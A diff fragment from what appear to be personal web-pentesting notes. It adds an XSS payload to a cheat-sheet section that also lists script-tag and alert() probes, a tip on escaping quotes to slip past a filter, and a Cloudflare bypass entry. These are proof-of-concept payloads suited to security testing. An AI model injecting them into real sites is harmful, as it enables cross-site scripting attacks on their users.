@@ -339,7 +339,7 @@ login
 --------------------------------------------------------------------------------------------------
             (((XSS))
  https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md
-            
+            <img/src/onerror=alert(1)>
 - <script>alert(\"hossam\")</script>        // add \ before " to escape filter
 - cloudflare bypass 
 "-alert(0)-"		X
